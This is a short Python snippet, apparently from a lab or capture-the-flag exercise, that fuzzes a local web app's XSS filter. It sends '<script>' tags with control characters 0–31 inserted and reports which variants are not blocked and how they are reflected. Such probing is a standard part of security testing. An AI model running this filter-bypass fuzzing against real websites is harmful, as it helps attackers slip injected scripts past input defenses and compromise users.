# Test control characters before letter
python3 -c "
import requests

for b in range(0, 32):
    char = chr(b)
    payload = f'<{char}script>'
    params = {'url': 'test', 'name': payload}
    r = requests.get('http://localhost:5000/page', params=params)
    if \"can't use\" in r.text:
        status = 'BLOCKED'
    elif 'error_umbrella' in r.text:
        status = 'Failed'
    else:
        status = 'OTHER'
    if status != 'BLOCKED':
        print(f'char {b}: {status} - reflected as:', r.text[r.text.find('input'):r.text.find('input')+100] if 'input' in r.text else 'N/A')
" 2>&1
